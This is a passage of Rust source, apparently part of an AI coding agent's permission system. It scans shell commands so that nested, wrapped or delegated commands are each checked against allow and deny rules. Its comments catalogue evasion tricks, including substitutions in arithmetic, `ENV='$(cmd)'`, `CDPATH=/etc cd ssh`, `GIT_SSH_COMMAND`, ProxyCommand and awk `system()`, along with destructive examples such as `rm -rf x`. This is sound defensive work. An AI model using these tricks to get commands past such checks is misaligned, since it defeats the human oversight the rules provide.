//! Splits a shell command into the commands it would run, so each one is
//! checked against the permission rules on its own: `git status && rm -rf x`
//! asks about `rm -rf x` too, and so do commands inside `$(...)`, backticks,
//! `<(...)`, pipelines, subshells, groups, loops, conditionals, `case` arms,
//! function bodies and unquoted heredocs. `cd` targets are collected so
//! directories outside the project need `external_directory` approval.
//!
//! Ported from OpenCode's `ShellScan` (packages/core/src/shell/scan.ts) and
//! `ShellParse` (shell/parse.ts), MIT. CodeSmith runs commands with
//! `<shell> -c`, so only the POSIX/Bash/Zsh grammar is ported, not
//! PowerShell. Like OpenCode, input that cannot be analyzed (malformed
//! syntax, or a construct this scanner does not know) is reported as
//! opaque and the command is refused rather than run unchecked.
//!
//! Known gaps against OpenCode's scanner (these become opaque, so they are
//! refused rather than let through): `time`/`coproc` before a compound
//! command, and C-style `for ((...))` headers containing substitutions.
//! `&>` is accepted in every dialect (OpenCode treats it as `&` then `>`
//! under plain `sh`). Zsh's short loops (`for x (a b) cmd`, `for x in a b;
//! cmd`, `for k v (...)`) are read as Zsh reads them; Bash and Dash refuse
//! them, so that reading only adds commands.
//!
//! Beyond OpenCode, what a command runs on its behalf is checked too (see
//! [`Analysis::delegated`]):
//!
//! - Wrappers, by each one's option grammar: `env`, `sudo`, `doas`, `su
//!   -c`, `runuser`, `pkexec`, `nice`, `timeout`/`gtimeout`, `stdbuf`,
//!   `ionice`, `chrt`, `taskset`, `setsid`, `flock`/`lockf`, `chroot`,
//!   `script`, `unbuffer`, `caffeinate`, `arch`, `watch` (a shell string),
//!   `parallel`, `xargs`, `find -exec`, `strace`... A wrapper that runs a
//!   shell reading its input (`sudo -s`, `chroot DIR`, `su user`, `at`), or
//!   whose options the scan cannot read, is dynamic. Lock files and
//!   typescripts they create are writes.
//! - Shell code other programs run: `git -c core.pager=...`/`alias.x=!...`,
//!   `git rebase -x`, `GIT_SSH_COMMAND=...` and other [`COMMAND_VARS`],
//!   `ssh -o ProxyCommand=...`, `rsync -e`, `awk`'s `system("...")` and
//!   pipes, `sed`'s `e cmd`. Static code is scanned like `sh -c '...'`;
//!   code only known at run time is dynamic, like `sh -c "$x"`.
//! - `ssh host cmd`: the remote command's commands are checked as if local
//!   (a rule denying `rm *` denies `ssh host rm x`), but its `cd`s and
//!   files are the other machine's. With no command, the remote shell runs
//!   what it reads: dynamic.
//! - Code in another language (`python -c`, `perl -e`, `node -e`, a
//!   heredoc piped to `python3`, an awk program calling `system($0)`, a sed
//!   `s///e`, a program built from variables): the scanner cannot read it,
//!   and such code can do anything a command can without running one, so
//!   command rules could not hold it anyway. It is checked as the resource
//!   `code:NAME CODE`, which a rule allowing `python *` does not match: with
//!   an allow-list it asks once and "always" saves `code:python *`; a rule
//!   denying `code:*` refuses it. A script file (`python x.py`), a module
//!   (`-m`) and an ordinary awk/sed program are no marker.
//! - Files programs write by name: `awk '{print > "f"}'`, `sed 'w f'`,
//!   `find -fprint f`.
//!
//! Left open: what a program does from its own config or a file it reads
//! (`git` hooks and config-file aliases, `make`, `npm run`, `python x.py`);
//! project runners that run a command in an environment (`uv run`,
//! `poetry run`, `bundle exec`, `npx`), checked as the runner's own
//! command; and commands that run in a container (`docker run`/`exec`,
//! `kubectl exec`), checked as the `docker`/`kubectl` command.
//!
//! `tests/shell_differential.rs` checks this scanner against what Bash,
//! Zsh, `/bin/sh`, Dash and macOS's Bash 3.2 actually run, and its corpus
//! (`tests/fixtures/shell_differential/corpus.txt`) holds every bypass it
//! found. Where the shells disagree, the reading that runs more is checked:
//! Zsh's (`=cmd`, `$~x`, `""~`, `4=x`, tables like `commands[ls]=`), Bash
//! 3.2's `$(` matching, and Dash's `((` (checked against deny rules only,
//! see [`Command::alternate`]). Dash runs `(( $x ))` as the command `$x`:
//! that is dynamic only when `$x` can name a command (see
//! [`dash_name_matters`]), so `(( $i < 3 ))` on a counter asks nothing.

use std::cell::{Cell, RefCell};
use std::collections::HashMap;
use std::path::{Path, PathBuf};

const MAX_INPUT: usize = 64 * 1024;
const MAX_DEPTH: usize = 32;
const MAX_COMPOUND_DEPTH: usize = 256;
/// Characters the scanner may look at for one [`analyze`] (or [`scan`])
/// call, across every reading and nested scan. The scan runs synchronously
/// in the turn, so no input may hold it for long: one past this is refused
/// as [`TOO_COMPLEX`]. A 64 KiB script of ordinary commands reads each
/// character a handful of times.
const MAX_STEPS: usize = 2_000_000;
/// The reason for input that would take the scanner too long to read.
const TOO_COMPLEX: Opaque = "too-complex";

/// A text read as Dash would, and the depth it is read at.
type DashKey = (Vec<char>, usize);

/// State every scanner of one input shares, nested scans included.
#[derive(Default)]
struct Shared {
    /// Characters looked at so far (see [`MAX_STEPS`]).
    steps: Cell<usize>,
    /// [`Scanner::dash_reading`] results by text and depth: nested `$((`
    /// reach the same text both as arithmetic and as Dash's subshells, so
    /// reading each once keeps the work polynomial.
    dash: RefCell<HashMap<DashKey, Vec<Command>>>,
    /// Variables the script may give text rather than a number (assigned,
    /// read, looped over): Dash runs `(( $x ))` as the command `$x`, which
    /// matters only when `x` can name one. See [`dash_name_matters`].
    text_vars: RefCell<std::collections::HashSet<String>>,
    /// Assignments to variables that hold a command line other programs
    /// run (`GIT_SSH_COMMAND=...`), as `(raw, value)`; see [`COMMAND_VARS`].
    command_vars: RefCell<Vec<(String, String)>>,
}

/// Roughly the work of copying `cmd`, in characters.
fn command_size(cmd: &Command) -> usize {
    let words = |w: &[String]| w.iter().map(|w| w.len() + 1).sum::<usize>();
    cmd.resource.len() + words(&cmd.words) + words(&cmd.raw_words)
}

impl Shared {
    fn exhausted(&self) -> bool {
        self.steps.get() > MAX_STEPS
    }

    /// Counts `n` steps of work done outside the scanner (reading a
    /// program given to `awk` or `sed`).
    fn charge(&self, n: usize) {
        self.steps.set(self.steps.get().saturating_add(n));
    }
}

/// `-12`, `7`: a word that is a plain integer.
fn integer_literal(raw: &str) -> bool {
    let digits = raw.strip_prefix(['-', '+']).unwrap_or(raw);
    !digits.is_empty() && digits.chars().all(|c| c.is_ascii_digit())
}

/// `$((i + 1))`: a word that is one arithmetic expansion, so a number.
fn arithmetic_only(raw: &str) -> bool {
    raw.starts_with("$((")
        && raw.ends_with("))")
        && !raw.contains(['`', '\'', '"', '\\'])
        && raw
            .match_indices("$(")
            .all(|(i, _)| raw[i + 2..].starts_with('('))
}

/// One command the shell would run.
#[derive(Debug, Clone, PartialEq, Eq, Hash, Default)]
pub struct Command {
    /// The command's source text, including assignments and redirects.
    pub resource: String,
    /// Its words with quotes and escapes removed (no assignments or redirects).
    pub words: Vec<String>,
    /// The same words as written.
    pub raw_words: Vec<String>,
    /// A bare `export`/`declare`/`unset`... that only binds variables.
    pub declaration: bool,
    /// Words before the first redirect, when a redirect sits between words.
    pub redirect_word_count: Option<usize>,
    /// For commands with no words (only redirects and assignments): where the
    /// first redirect operator ends, in chars from the start of `resource`.
    pub redirect_prefix_end: Option<usize>,
    /// Files the command's redirects write to (`>`, `>>`, `&>`, `>|`, `<>`,
    /// `>&file`), as `(raw, value)`.
    pub writes: Vec<(String, String)>,
    /// Only one shell's reading: Dash has no `((`, so `(( (rm x) ))` is two
    /// subshells running `rm x` there. Checked as another name for what
    /// runs (see [`Analysis::delegated`]), not as a command of its own.
    pub alternate: bool,
    /// An arithmetic command `((...))`: its one word is the expression,
    /// which names no command (substitutions in it are commands of their
    /// own, and text it evaluates is flagged as [`Scanned::dynamic`]).
    pub arithmetic: bool,
}

/// What `scan_all` found: the commands, and whether the input can run code
/// the commands do not show.
#[derive(Debug, Clone, PartialEq, Default)]
pub struct Scanned {
    pub commands: Vec<Command>,
    /// Set when text the script binds or reads at run time can reach a
    /// place the shell evaluates as code (arithmetic, subscripts, `${x@P}`):
    /// `x='a[$(touch X)]'; echo $((x))` runs `touch X`.
    pub dynamic: Option<Opaque>,
    /// Set when the script changes what `cd` resolves against (`CDPATH`,
    /// `HOME`, `PWD`, `OLDPWD`, physical mode): see [`Analysis::unknown_cwd`].
    pub cd_context: bool,
}

/// Why a command could not be analyzed.
pub type Opaque = &'static str;

/// Every command in `input`, outer commands before the ones substituted into them.
/// Readings only some shell gives ([`Command::alternate`]) are left out.
pub fn scan(input: &str) -> Result<Vec<Command>, Opaque> {
    scan_all(input).map(|s| s.commands.into_iter().filter(|c| !c.alternate).collect())
}

/// [`scan`], plus whether the input evaluates text as code at run time.
pub fn scan_all(input: &str) -> Result<Scanned, Opaque> {
    scan_shared(input, &Shared::default())
}

fn scan_shared(input: &str, shared: &Shared) -> Result<Scanned, Opaque> {
    if input.len() > MAX_INPUT {
        return Err("invalid-structure");
    }
    let chars: Vec<char> = input.chars().collect();
    let mut s = Scanner::new(&chars, 0, shared);
    let result = s.list();
    if shared.exhausted() {
        // Whatever the scan made of the input, it stopped looking early.
        return Err(TOO_COMPLEX);
    }
    let (_, stop) = result?;
    match stop {
        Stop::Eof => {}
        Stop::RParen | Stop::Stray => return Err("invalid-structure"),
        Stop::Keyword(_) | Stop::CaseEnd => return Err("compound-command"),
    }
    if !s.heredocs.is_empty() {
        return Err("heredoc");
    }
    let flags = s.flags;
    Ok(Scanned {
        commands: s.finish(),
        dynamic: (flags.payload && flags.sink).then_some("dynamic-execution"),
        cd_context: flags.cd_context,
    })
}

// ---------------------------------------------------------------------------
// Scanner
// ---------------------------------------------------------------------------

struct Item {
    cmd: Command,
    /// Char span in this scanner's source; `None` when `cmd.resource` is final.
    span: Option<(usize, usize)>,
}

#[derive(Debug, Clone, Copy, PartialEq)]
enum Op {
    And,
    Or,
    Pipe,
    PipeAmp,
    Semi,
    Amp,
    CaseEnd,
    LParen,
    RParen,
}

struct Word {
    start: usize,
    end: usize,
    raw: String,
    value: String,
    quoted: bool,
    assignment: bool,
    nested: Vec<Item>,
}

struct Redir {
    start: usize,
    end: usize,
    op_end: usize,
    heredoc: bool,
    nested: Vec<Item>,
    /// The file written to, as `(raw, value)`.
    write: Option<(String, String)>,
}

/// What the script does with text, for [`Scanned::dynamic`].
#[derive(Debug, Default, Clone, Copy)]
struct Flags {
    /// The script holds text the shell could evaluate as code: a literal `$`
    /// or backtick (quoted or escaped), an ANSI-C escape, or text only known
    /// at run time (command output, `read`, globbed file names).
    payload: bool,
    /// The script evaluates text: arithmetic or a subscript naming a
    /// variable, a binding builtin given a subscript, `${!x}`, `${x@P}`.
    sink: bool,
    /// The script sets what `cd` resolves against.
    cd_context: bool,
}

impl Flags {
    /// Text that runs no matter where it came from (`alias x=...`).
    fn eval(&mut self) {
        self.payload = true;
        self.sink = true;
    }
}

enum Tok {
    Word(Word),
    Redir(Redir),
    Op(Op, usize),
    Newline,
    Eof,
}

#[derive(Debug, PartialEq)]
enum Stop {
    Eof,
    RParen,
    CaseEnd,
    Keyword(String),
    /// A separator where a command should start.
    Stray,
}

struct Heredoc {
    delimiter: String,
    strip_tabs: bool,
    quoted: bool,
}

struct Scanner<'a> {
    s: &'a [char],
    shared: &'a Shared,
    pos: usize,
    depth: usize,
    compound: usize,
    /// Nesting of `${...}` expansions.
    params: usize,
    out: Vec<Item>,
    heredocs: Vec<Heredoc>,
    /// Indexes into `out` of commands owning a heredoc whose body is still to come.
    heredoc_owners: Vec<usize>,
    /// Where the last heredoc body read ends, for its owner pushed afterwards.
    heredoc_end: Option<usize>,
    /// Commands substituted into heredoc bodies, kept until their owner is pushed.
    heredoc_nested: Vec<Item>,
    peeked: Option<Tok>,
    flags: Flags,
    /// Inside double quotes, where `'` in `${x:-'...'}` is an ordinary
    /// character: `"${x:-'$(cmd)'}"` runs `cmd`.
    in_dquote: usize,
    /// Reading as Dash, which has no `((` command.
    dash: bool,
}

/// Variables a shell evaluates as code or expands as prompts when they are
/// set (or inherited from the environment): `ENV='$(cmd)' sh -i` runs `cmd`.
const SHELL_EVALUATED: [&str; 21] = [
    "PS0",
    "PS1",
    "PS2",
    "PS3",
    "PS4",
    "PROMPT_COMMAND",
    "BASH_ENV",
    "ENV",
    "SHELLOPTS",
    "BASHOPTS",
    "ZDOTDIR",
    "NULLCMD",
    "READNULLCMD",
    "PROMPT",
    "PROMPT2",
    "PROMPT3",
    "PROMPT4",
    "RPROMPT",
    "RPS1",
    "SPROMPT",
    "FCEDIT",
];

/// Variables `cd` resolves against: `CDPATH=/etc cd ssh` leaves the project.
const CD_CONTEXT: [&str; 6] = ["CDPATH", "cdpath", "HOME", "PWD", "OLDPWD", "home"];

/// Variables that are the shell's own tables of what names run: Bash's
/// command hash and aliases, Zsh's `zsh/parameter` arrays and hook lists.
fn shell_table(name: &str) -> bool {
    const TABLES: [&str; 19] = [
        "BASH_CMDS",
        "BASH_ALIASES",
        "aliases",
        "galiases",
        "saliases",
        "dis_aliases",
        "dis_galiases",
        "dis_saliases",
        "functions",
        "dis_functions",
        "functions_source",
        "commands",
        "builtins",
        "dis_builtins",
        "reswords",
        "dis_reswords",
        "nameddirs",
        "userdirs",
        "options",
    ];
    TABLES.contains(&name) || name.ends_with("_functions")
}

const TERMINATORS: [&str; 7] = ["then", "elif", "else", "fi", "do", "done", "esac"];
const DECLARATIONS: [&str; 7] = [
    "declare", "typeset", "export", "readonly", "local", "unset", "unsetenv",
];

/// A declaration operand that only binds a name: an option without `i`,
/// `a`, `A` or `n` (integer, array and nameref bindings evaluate their
/// value), a name, or `name=value` whose value has no expansion, quote-
/// hidden code or subscript.
fn static_declaration_operand(raw: &str) -> bool {
    if let Some(flags) = raw.strip_prefix(['-', '+']) {
        return flags
            .chars()
            .all(|c| c.is_ascii_alphabetic() && !"iaAn".contains(c));
    }
    let (name, value) = match raw.split_once('=') {
        Some((n, v)) => (n.trim_end_matches('+'), Some(v)),
        None => (raw, None),
    };
    let plain_name =
        name.chars().next().is_some_and(is_name_start) && name.chars().all(is_name_char);
    plain_name
        && value.is_none_or(|v| {
            !v.contains(['$', '`', '\\', '[', ']', '(', ')', '{', '}', '*', '?', '~'])
        })
}

/// Commands whose output is fixed by their static arguments, so a
/// substitution of them cannot hand the script code to evaluate.
const KNOWN_OUTPUT: [&str; 10] = [
    "date", "echo", "expr", "getconf", "id", "nproc", "printf", "seq", "uname", "wc",
];

fn output_is_known(items: &[Item]) -> bool {
    items.iter().all(|it| {
        let c = &it.cmd;
        c.writes.is_empty()
            && c.words
                .first()
                .is_some_and(|w| KNOWN_OUTPUT.contains(&w.as_str()))
            && c.raw_words.iter().all(|w| {
                w.chars()
                    .all(|ch| ch.is_ascii_alphanumeric() || "-_.,:/+=%@ ".contains(ch))
            })
    })
}

/// Whether `${body}` evaluates text: a subscript or `:offset` naming a
/// variable (arithmetic), `${!x}` (indirection), `${x@P}` (prompt
/// expansion) or Zsh `${(e)x}` flags.
fn parameter_evaluates(body: &str) -> bool {
    // Zsh's `${=x}`, `${^x}`, `${~x}`, `${+x}` prefix the name.
    let body = body.trim_start_matches(['=', '^', '~', '+']);
    let names_something = |t: &str| t.chars().any(|c| is_name_start(c) || c == '$' || c == '`');
    if body.starts_with(['!', '(']) && body.len() > 1 {
        return true;
    }
    let head = body.trim_start_matches('#');
    let name_end = if head.starts_with(|c: char| "@*?$!-".contains(c)) {
        1
    } else {
        head.find(|c: char| !is_name_char(c)).unwrap_or(head.len())
    };
    let rest = &head[name_end..];
    if rest.starts_with('@') {
        return true;
    }
    if let Some(sub) = rest.strip_prefix('[') {
        if names_something(sub) {
            return true;
        }
    }
    if let Some(off) = rest.strip_prefix(':') {
        if !off.starts_with(['-', '=', '?', '+']) && names_something(off) {
            return true;
        }
    }
    false
}

fn is_name_start(c: char) -> bool {
    c.is_ascii_alphabetic() || c == '_'
}

fn is_name_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || c == '_'
}

impl<'a> Scanner<'a> {
    fn new(s: &'a [char], depth: usize, shared: &'a Shared) -> Self {
        Scanner {
            s,
            shared,
            pos: 0,
            depth,
            compound: 0,
            params: 0,
            out: Vec::new(),
            heredocs: Vec::new(),
            heredoc_owners: Vec::new(),
            heredoc_end: None,
            heredoc_nested: Vec::new(),
            peeked: None,
            flags: Flags::default(),
            in_dquote: 0,
            dash: false,
        }
    }

    fn finish(mut self) -> Vec<Command> {
        let s = self.s;
        let rest = std::mem::take(&mut self.heredoc_nested);
        self.out.extend(rest);
        self.out
            .into_iter()
            .map(|mut it| {
                if let Some((a, b)) = it.span {
                    it.cmd.resource = s[a..b].iter().collect();
                }
                it.cmd
            })
            .collect()
    }

    fn at(&self, i: usize) -> Option<char> {
        let steps = &self.shared.steps;
        steps.set(steps.get() + 1);
        self.s.get(i).copied()
    }

    /// Counts `n` steps of work done without looking at characters.
    fn charge(&self, n: usize) {
        let steps = &self.shared.steps;
        steps.set(steps.get().saturating_add(n));
    }

    /// Stops a scan that has used up [`MAX_STEPS`]. Called wherever the
    /// scanner starts reading something again, so it stops soon after.
    fn tick(&self) -> Result<(), Opaque> {
        if self.shared.exhausted() {
            return Err(TOO_COMPLEX);
        }
        Ok(())
    }

    fn starts(&self, i: usize, text: &str) -> bool {
        (i..).zip(text.chars()).all(|(j, c)| self.at(j) == Some(c))
    }

    fn text(&self, a: usize, b: usize) -> String {
        self.s[a..b].iter().collect()
    }

    // ---- lexing ----------------------------------------------------------

    fn skip_blanks(&mut self) {
        loop {
            match self.at(self.pos) {
                Some(' ') | Some('\t') => self.pos += 1,
                Some('\\') if self.at(self.pos + 1) == Some('\n') => self.pos += 2,
                _ => return,
            }
        }
    }

    fn peek(&mut self) -> Result<&Tok, Opaque> {
        if self.peeked.is_none() {
            let t = self.lex(false)?;
            self.peeked = Some(t);
        }
        Ok(self.peeked.as_ref().unwrap())
    }

    fn next(&mut self) -> Result<Tok, Opaque> {
        match self.peeked.take() {
            Some(t) => Ok(t),
            None => self.lex(false),
        }
    }

    fn lex(&mut self, cond: bool) -> Result<Tok, Opaque> {
        self.tick()?;
        loop {
            self.skip_blanks();
            match self.at(self.pos) {
                None => return Ok(Tok::Eof),
                Some('#') => {
                    while let Some(c) = self.at(self.pos) {
                        if c == '\n' {
                            break;
                        }
                        self.pos += 1;
                    }
                }
                Some('\n') => {
                    self.pos += 1;
                    self.read_heredocs()?;
                    return Ok(Tok::Newline);
                }
                Some(c) if c.is_whitespace() => return Err("invalid-structure"),
                Some(_) => break,
            }
        }
        let p = self.pos;
        let c = self.at(p).unwrap();
        let n = self.at(p + 1);
        if (c == '<' || c == '>') && n == Some('(') {
            return Ok(Tok::Word(self.word()?));
        }
        if cond {
            if c == ';' {
                self.pos += 1;
                return Ok(Tok::Op(Op::Semi, p));
            }
            if "()<>&|".contains(c) {
                let len = if (c == '&' || c == '|') && n == Some(c) {
                    2
                } else {
                    1
                };
                self.pos += len;
                let raw = self.text(p, p + len);
                return Ok(Tok::Word(Word {
                    start: p,
                    end: p + len,
                    value: raw.clone(),
                    raw,
                    quoted: false,
                    assignment: false,
                    nested: Vec::new(),
                }));
            }
            return Ok(Tok::Word(self.word()?));
        }
        let ops: [(&str, Op); 13] = [
            (";;&", Op::CaseEnd),
            (";;", Op::CaseEnd),
            (";&", Op::CaseEnd),
            (";|", Op::CaseEnd),
            ("&&", Op::And),
            ("||", Op::Or),
            ("|&", Op::PipeAmp),
            ("&!", Op::Amp),
            ("&|", Op::Amp),
            ("|", Op::Pipe),
            (";", Op::Semi),
            ("(", Op::LParen),
            (")", Op::RParen),
        ];
        if c == '&' && n != Some('>') {
            for (t, op) in ops {
                if t.starts_with('&') && self.starts(p, t) {
                    self.pos += t.len();
                    return Ok(Tok::Op(op, p));
                }
            }
            self.pos += 1;
            return Ok(Tok::Op(Op::Amp, p));
        }
        if c != '&' {
            for (t, op) in ops {
                if self.starts(p, t) {
                    self.pos += t.chars().count();
                    return Ok(Tok::Op(op, p));
                }
            }
        }
        if let Some(op_start) = self.redirect_start(p) {
            return Ok(Tok::Redir(self.redirect(p, op_start)?));
        }
        Ok(Tok::Word(self.word()?))
    }

    /// Where a redirect operator starts, if one starts at `p` (after an
    /// optional fd number or `{name}`).
    fn redirect_start(&self, p: usize) -> Option<usize> {
        let c = self.at(p)?;
        if c == '<' || c == '>' || (c == '&' && self.at(p + 1) == Some('>')) {
            return Some(p);
        }
        if c.is_ascii_digit() {
            let mut i = p;
            while self.at(i).is_some_and(|c| c.is_ascii_digit()) {
                i += 1;
            }
            if matches!(self.at(i), Some('<') | Some('>')) && self.at(i + 1) != Some('(') {
                return Some(i);
            }
        }
        if c == '{' && self.at(p + 1).is_some_and(is_name_start) {
            let mut i = p + 1;
            while self.at(i).is_some_and(is_name_char) {
                i += 1;
            }
            if self.at(i) == Some('}') && matches!(self.at(i + 1), Some('<') | Some('>')) {
                return Some(i + 1);
            }
        }
        None
    }

    fn redirect(&mut self, start: usize, op_start: usize) -> Result<Redir, Opaque> {
        const OPS: [&str; 12] = [
            "&>>", "&>", "<<<", "<<-", "<<", "<>", "<&", ">&", ">|", ">>", ">", "<",
        ];
        let op = OPS
            .iter()
            .find(|o| self.starts(op_start, o))
            .copied()
            .ok_or("invalid-redirect")?;
        let op_end = op_start + op.len();
        self.pos = op_end;
        self.skip_blanks();
        match self.at(self.pos) {
            None | Some('\n') | Some(';') | Some('|') | Some(')') => {
                return Err("invalid-redirect")
            }
            Some('&') if !(op == ">&" || op == "<&") => return Err("invalid-redirect"),
            Some('<') | Some('>') if self.at(self.pos + 1) != Some('(') => {
                return Err("invalid-redirect")
            }
            Some('(') => return Err("invalid-redirect"),
            _ => {}
        }
        let target = self.word()?;
        let heredoc = op == "<<" || op == "<<-";
        if heredoc {
            self.heredocs.push(Heredoc {
                delimiter: target.value.clone(),
                strip_tabs: op == "<<-",
                quoted: target.quoted,
            });
        }
        let dup = op == ">&" && {
            let t = target.raw.trim_end_matches('-');
            t.is_empty() || t.chars().all(|c| c.is_ascii_digit())
        };
        let writes = matches!(op, ">" | ">>" | "&>" | "&>>" | ">|" | "<>") || (op == ">&" && !dup);
        Ok(Redir {
            start,
            end: target.end,
            op_end,
            heredoc,
            nested: target.nested,
            write: writes.then(|| (target.raw.clone(), target.value.clone())),
        })
    }

    /// Read the bodies of pending heredocs, starting at the line after the one
    /// that introduced them. Returns where the last body ends.
    fn read_heredocs(&mut self) -> Result<(), Opaque> {
        if self.heredocs.is_empty() {
            return Ok(());
        }
        let docs = std::mem::take(&mut self.heredocs);
        let mut end = self.pos;
        for doc in docs {
            let mut found = false;
            // An unquoted body joins a line ending in `\` to the next one:
            // Bash and Zsh end the body at `EO\` + `F`, Dash does not.
            let mut logical = String::new();
            let mut continued = false;
            while self.pos < self.s.len() {
                let line_start = self.pos;
                let mut line_end = line_start;
                while self.at(line_end).is_some_and(|c| c != '\n') {
                    line_end += 1;
                }
                let mut line = self.text(line_start, line_end);
                if doc.strip_tabs {
                    line = line.trim_start_matches('\t').to_string();
                }
                if !doc.quoted {
                    let was_continued = continued;
                    if !was_continued {
                        logical.clear();
                    }
                    let trailing = line.chars().rev().take_while(|&c| c == '\\').count();
                    continued = trailing % 2 == 1;
                    logical.push_str(if continued {
                        &line[..line.len() - 1]
                    } else {
                        &line
                    });
                    if was_continued && !continued && logical == doc.delimiter {
                        return Err("heredoc");
                    }
                    if was_continued {
                        // Not a delimiter: the line continues the one before.
                        let nested = self.body_expansions(line_start, line_end)?;
                        self.heredoc_nested.extend(nested);
                        self.pos = (line_end + 1).min(self.s.len());
                        continue;
                    }
                }
                if line == doc.delimiter {
                    found = true;
                    end = line_end;
                    self.pos = (line_end + 1).min(self.s.len());
                    break;
                }
                if doc.quoted {
                    if line.contains(['$', '`']) {
                        self.flags.payload = true;
                    }
                } else {
                    let nested = self.body_expansions(line_start, line_end)?;
                    self.heredoc_nested.extend(nested);
                }
                self.pos = (line_end + 1).min(self.s.len());
            }
            if !found {
                return Err("heredoc");
            }
        }
        let owners = std::mem::take(&mut self.heredoc_owners);
        if owners.is_empty() {
            self.heredoc_end = Some(end);
        } else {
            for i in owners {
                if let Some((_, b)) = self.out[i].span.as_mut() {
                    *b = end;
                }
            }
            let nested = std::mem::take(&mut self.heredoc_nested);
            self.out.extend(nested);
        }
        Ok(())
    }

    /// Commands substituted into an unquoted heredoc line.
    fn body_expansions(&mut self, a: usize, b: usize) -> Result<Vec<Item>, Opaque> {
        let mut nested = Vec::new();
        let mut i = a;
        while i < b {
            match self.at(i) {
                Some('\\') => {
                    if matches!(self.at(i + 1), Some('$') | Some('`')) {
                        self.flags.payload = true;
                    }
                    i += 2
                }
                Some('$') | Some('`') => {
                    let mut raw = String::new();
                    let mut value = String::new();
                    self.pos = i;
                    self.expansion(&mut raw, &mut value, &mut nested)?;
                    if self.pos > b {
                        return Err("heredoc");
                    }
                    i = self.pos.max(i + 1);
                }
                _ => i += 1,
            }
        }
        Ok(nested)
    }

    /// A word starting at `self.pos`.
    fn word(&mut self) -> Result<Word, Opaque> {
        let start = self.pos;
        let mut raw = String::new();
        let mut value = String::new();
        let mut quoted = false;
        let mut assignment = false;
        let mut nested = Vec::new();
        let mut name_ok = true;
        if let (Some(c), Some('(')) = (self.at(start), self.at(start + 1)) {
            if c == '<' || c == '>' {
                self.pos += 2;
                raw.push(c);
                raw.push('(');
                self.substitution(&mut nested)?;
                if self
                    .at(self.pos)
                    .is_some_and(|c| !" \t\n;&|()<>".contains(c))
                {
                    // `<(cmd)""` is one word: where it ends is not plain.
                    return Err("process-substitution");
                }
                raw.push_str(&self.text(start + 2, self.pos));
                value = raw.clone();
                return Ok(Word {
                    start,
                    end: self.pos,
                    raw,
                    value,
                    quoted: false,
                    assignment: false,
                    nested,
                });
            }
        }
        while let Some(c) = self.at(self.pos) {
            match c {
                '<' | '>' if !raw.is_empty() && self.at(self.pos + 1) == Some('(') => {
                    // `x>(cmd)`: Bash in POSIX mode keeps it in the word.
                    return Err("process-substitution");
                }
                ' ' | '\t' | '\n' | ';' | '&' | '|' | '(' | ')' | '<' | '>' => {
                    if c == '(' && assignment && raw.ends_with('=') {
                        // Array assignment: `x=(a b)`. Its elements are
                        // words, so `x=($(cmd))` and `x=([$(cmd)]=1)` run
                        // `cmd`.
                        let open = self.pos;
                        self.array_elements(&mut nested)?;
                        let t = self.text(open, self.pos);
                        raw.push_str(&t);
                        value.push_str(&t);
                        continue;
                    }
                    break;
                }
                '\\' => match self.at(self.pos + 1) {
                    Some('\n') => {
                        // A continuation before a word break is not part of the word.
                        let mut j = self.pos + 2;
                        while self.at(j) == Some('\\') && self.at(j + 1) == Some('\n') {
                            j += 2;
                        }
                        if raw.ends_with('}') {
                            // Zsh ends the command at `word}\<newline>`.
                            return Err("line-continuation");
                        }
                        let after = self.at(j);
                        if after.is_none_or(|c| " \t\n;&|()<>".contains(c)) {
                            break;
                        }
                        raw.push_str("\\\n");
                        self.pos += 2;
                    }
                    Some(n) => {
                        if n == '$' || n == '`' {
                            self.flags.payload = true;
                        }
                        raw.push('\\');
                        raw.push(n);
                        value.push(n);
                        quoted = true;
                        name_ok = false;
                        self.pos += 2;
                    }
                    None => return Err("unterminated-escape"),
                },
                '\'' => {
                    let close = (self.pos + 1..self.s.len())
                        .find(|&i| self.s[i] == '\'')
                        .ok_or("unterminated-quote")?;
                    let inner = self.text(self.pos + 1, close);
                    if inner.contains(['$', '`']) {
                        self.flags.payload = true;
                    }
                    raw.push_str(&self.text(self.pos, close + 1));
                    value.push_str(&inner);
                    quoted = true;
                    name_ok = false;
                    self.pos = close + 1;
                }
                '"' => {
                    quoted = true;
                    name_ok = false;
                    self.double_quoted(&mut raw, &mut value, &mut nested)?;
                }
                '$' | '`' => {
                    name_ok = false;
                    if c == '$' && self.at(self.pos + 1) == Some('\'') {
                        quoted = true;
                    }
                    self.expansion(&mut raw, &mut value, &mut nested)?;
                }
                '=' if name_ok && !assignment && !raw.is_empty() && !quoted => {
                    // A continuation is removed before the word is read:
                    // `r\<newline>=m` is the assignment `r=m`.
                    let joined = raw.replace("\\\n", "");
                    let name = joined.trim_end_matches('+');
                    let base = name.split('[').next().unwrap_or("");
                    let positional = !base.is_empty()
                        && base.len() == name.len()
                        && base.chars().all(|c| c.is_ascii_digit());
                    if (base.chars().next().is_some_and(is_name_start)
                        && base.chars().all(is_name_char)
                        && (base.len() == name.len() || name.ends_with(']')))
                        || positional
                    {
                        // Zsh also assigns positional parameters: `4=x cmd`.
                        assignment = true;
                    }
                    raw.push('=');
                    value.push('=');
                    self.pos += 1;
                }
                '[' if name_ok && !assignment => {
                    // Possible subscript in `a[i]=x`; keep scanning as text.
                    raw.push('[');
                    value.push('[');
                    self.pos += 1;
                }
                c => {
                    if !(is_name_char(c) || c == '+' || c == ']') {
                        name_ok = false;
                    }
                    raw.push(c);
                    value.push(c);
                    self.pos += 1;
                }
            }
        }
        Ok(Word {
            start,
            end: self.pos,
            raw,
            value,
            quoted,
            assignment,
            nested,
        })
    }

    /// The elements of `name=(...)`, from the `(` to just past the `)`.
    fn array_elements(&mut self, nested: &mut Vec<Item>) -> Result<(), Opaque> {
        self.pos += 1;
        loop {
            match self.at(self.pos) {
                None => return Err("invalid-structure"),
                Some(' ') | Some('\t') | Some('\n') => self.pos += 1,
                Some('\\') if self.at(self.pos + 1) == Some('\n') => self.pos += 2,
                Some('#') => {
                    while self.at(self.pos).is_some_and(|c| c != '\n') {
                        self.pos += 1;
                    }
                }
                Some(')') => {
                    self.pos += 1;
                    return Ok(());
                }
                Some(c)
                    if ";&|(".contains(c)
                        || ("<>".contains(c) && self.at(self.pos + 1) != Some('(')) =>
                {
                    return Err("invalid-structure")
                }
                Some(_) => {
                    let start = self.pos;
                    let mut w = self.word()?;
                    if self.pos == start {
                        return Err("invalid-structure");
                    }
                    nested.append(&mut w.nested);
                }
            }
        }
    }

    /// End (exclusive) of the parenthesized text starting at `p` (`(`).
    fn balanced(&self, p: usize) -> Result<usize, Opaque> {
        let mut depth = 0usize;
        let mut i = p;
